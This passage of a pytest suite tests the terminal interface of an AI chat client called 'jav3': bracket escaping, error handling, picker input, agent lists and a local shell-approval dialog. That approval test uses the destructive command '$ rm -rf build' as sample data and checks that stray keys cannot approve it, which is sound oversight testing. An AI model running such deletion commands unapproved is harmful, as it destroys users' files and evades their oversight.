    not eat the tag after it."""
    pytest.importorskip("textual")
    from textual.markup import to_content
    for raw in ("[startup — the operator just woke you", "a [ b", "x [/] y",
                "a\\[b]", "C:\\dir\\", "[b]bold[/b]", "[$error]x", "plain"):
        out = to_content(jav3._esc(raw) + "[b]tail[/]").plain
        assert out.replace("\u200b", "") == raw + "tail"


def _conv_server(convs, messages=None):
    def handler(request: httpx.Request) -> httpx.Response:
        path = request.url.path
        if path == "/api/devices/whoami":
            return httpx.Response(200, json={"username": "device:test"})
        if path == "/api/chat/options":
            return httpx.Response(200, json={"default": "deepseek/deepseek-flash",
                                             "models": [], "projects": [], "agents": []})
        if path == "/api/conversations":
            return httpx.Response(200, json={"conversations": convs})
        if path.endswith("/messages"):
            return httpx.Response(200, json=messages or {"messages": []})
        if path.endswith("/info"):
            return httpx.Response(200, json={"title": "t", "files": []})
        return httpx.Response(404, json={"detail": "nope"})
    return httpx.MockTransport(handler)


async def test_tui_brackets_in_titles_and_tool_args_do_not_crash(cfg):
    pytest.importorskip("textual")
    convs = [{"id": 300, "summary": "[startup — the operator just woke you (voice)",
              "started_at": "2026-08-10 06:12", "project_slug": "startup"},
             {"id": 301, "summary": "summarise\nthis", "started_at": "2026-08-10 06:13"}]
    app = jav3.build_tui("http://h:1", "jvd_x", transport=_conv_server(convs))
    async with app.run_test(size=(140, 40)) as pilot:
        await pilot.pause(0.3)
        app.dispatch("/sessions")
        assert await _until(pilot, lambda: type(app.screen).__name__ == "Picker")
        await pilot.pause(0.2)
        assert app.is_running
        assert app.screen.rows[1][1] == "summarise this"      # one line per chat
        await pilot.press("escape")
        await pilot.pause(0.1)
        # a command with an unbalanced bracket, running then done
        app.turn = jav3.TurnState()
        await app.handle_event({"type": "tool", "id": "1", "name": "run_code",
                                "args": {"command": "test [ -f x"}})
        await pilot.pause(0.3)                                  # the spinner redraws it
        await app.handle_event({"type": "tool_result", "id": "1", "name": "run_code",
                                "ok": False, "result": "[: missing ]"})
        app.notify("reply ready in [startup — x")                # toasts are plain text
        await pilot.pause(0.3)
        assert app.is_running
        assert "test [ -f x" in _text(app.query("ToolView").last().query_one("#head"))


def test_print_mode_peak_without_an_answer_is_not_sent():
    """jav3 -p in the peak window with stdin a pipe (read to the end already)
    died with an EOFError traceback; now it is a plain `not sent`."""
    def handler(request):
        return httpx.Response(409, json={"detail": "peak_confirmation_required"})

    def no_tty(question):
        raise EOFError
    with httpx.Client(base_url="http://h:1", transport=httpx.MockTransport(handler)) as c:
        with pytest.raises(jav3.CliError, match="not sent"):
            jav3.run_turn(c, "hi", None, None, io.StringIO(), no_tty)


async def test_tui_export_to_a_missing_dir_and_a_missing_editor_are_errors(cfg, monkeypatch):
    """Both used to end the app with a traceback."""
    pytest.importorskip("textual")
    import contextlib as _cl
    app = jav3.build_tui("http://h:1", "jvd_x", transport=_conv_server([]))
    async with app.run_test(size=(140, 40)) as pilot:
        await pilot.pause(0.3)
        app.cid = 5
        app.dispatch("/export /nonexistent-qa-dir/x.md")
        assert await _until(pilot, lambda: any("could not save" in _text(n)
                                               for n in app.query("Note")))
        monkeypatch.setenv("EDITOR", "/nonexistent-qa-editor")
        monkeypatch.setattr(app, "suspend", _cl.nullcontext)     # headless: no terminal
        app.editor.text = "draft"
        app.action_external_editor()
        await pilot.pause(0.2)
        assert app.is_running and app.editor.text == "draft"
        assert any("could not run" in str(n.message) for n in app._notifications)


async def test_tui_picker_keeps_letters_typed_before_the_filter_has_focus(cfg):
    """Typing "e2e" fast in a picker filtered on "e": the letters after the
    first reached the list before the filter had focus, and were dropped."""
    pytest.importorskip("textual")
    from textual import events
    app = jav3.build_tui("http://h:1", "jvd_x", transport=_conv_server([]))
    async with app.run_test(size=(140, 40)) as pilot:
        await pilot.pause(0.3)
        rows = [("demo", "demo", ""), ("e2e-smoke", "e2e-smoke", "")]
        app.run_worker(app.pick("Projects", rows))
        assert await _until(pilot, lambda: type(app.screen).__name__ == "Picker")
        scr = app.screen
        scr.start_typing("e")
        for ch in "2e":            # as if still in flight to the list
            scr.on_key(events.Key(ch, ch))
        await pilot.pause(0.1)
        assert scr.query_one("#filter").value == "e2e"
        ol = scr.query_one("#choices")
        assert ol.get_option_at_index(ol.highlighted).id == "e2e-smoke"


async def test_tui_local_approval_ignores_keys_typed_before_it_opened(cfg):
    """The /local approval pops up mid-turn, often while the operator is typing
    the next message: a stray a (always) or enter (yes) must not answer it."""
    pytest.importorskip("textual")
    app = jav3.build_tui("http://h:1", "jvd_x", transport=_conv_server([]))
    async with app.run_test(size=(140, 40)) as pilot:
        await pilot.pause(0.3)
        answers = []

        async def ask():
            answers.append(await app.local_approve("shell", "$ rm -rf build"))
        app.run_worker(ask())
        assert await _until(pilot, lambda: type(app.screen).__name__ == "LocalApprove")
        await pilot.press("a", "enter")                # the tail of a sentence
        await pilot.pause(0.1)
        assert type(app.screen).__name__ == "LocalApprove" and not answers
        await pilot.pause(0.6)
        await pilot.press("n")
        assert await _until(pilot, lambda: answers == ["no"])


async def test_tui_leader_hint_shows_every_key(cfg):
    pytest.importorskip("textual")
    app = jav3.build_tui("http://h:1", "jvd_x", transport=_conv_server([]))
    async with app.run_test(size=(140, 40)) as pilot:
        await pilot.pause(0.3)
        await pilot.press("ctrl+x")
        await pilot.pause(0.2)
        assert app.query_one("#status").size.height >= 2      # it wraps, not cut off
        await pilot.press("escape")
        await pilot.pause(0.2)
        assert app.query_one("#status").size.height == 1


async def test_tui_finished_by_time_is_newest_first_and_footer_without_model(cfg):
    pytest.importorskip("textual")
    msgs = {"messages": [{"role": "user", "content": "hi"},
                         {"role": "assistant", "content": "hello"}]}
    app = jav3.build_tui("http://h:1", "jvd_x", transport=_conv_server([], msgs))
    async with app.run_test(size=(140, 40)) as pilot:
        await pilot.pause(0.3)
        await app.open_conversation(7)
        await pilot.pause(0.1)
        assert _text(app.query("Footer").last()).rstrip() == "▣ Jav3"   # no dangling ·
        app.action_agents_view()
        assert await _until(pilot, lambda: type(app.screen).__name__ == "AgentsScreen")
        scr = app.screen
        from datetime import datetime, timedelta, timezone
        now = datetime.now(timezone.utc).replace(tzinfo=None)

        def ago(m):                       # the server's naive UTC timestamps
            return (now - timedelta(minutes=m)).isoformat(timespec="seconds")
        scr.trees["finished"] = jav3.AgentTree([
            {"id": 1, "project": "a", "started_at": ago(3)},
            {"id": 2, "project": "b", "started_at": ago(1)},
            {"id": 3, "project": "a", "started_at": ago(2)}])
        scr.mode, scr.group_by = "finished", "time"
        [(bucket, roots)] = scr._sections()
        assert bucket == "Today" and [r["id"] for r in roots] == [2, 3, 1]


async def test_tui_local_chat_shows_local_during_its_first_turn(cfg, tmp_path, monkeypatch):
    """Between `start` and the first /info the prompt said the loaded project
    instead of `local <dir>`."""
    pytest.importorskip("textual")
    monkeypatch.chdir(tmp_path)
    app = jav3.build_tui("http://h:1", "jvd_x", transport=_conv_server([]))
    async with app.run_test(size=(140, 40)) as pilot:
        await pilot.pause(0.3)
        app.local = True
        app.turn = jav3.TurnState()
        app.turn.local = True
        await app.handle_event({"type": "start", "conversation_id": 12})
        await pilot.pause(0.1)
        assert app.cid == 12 and app._project_label() is None
        assert "local" in _text(app.query_one("#meta"))
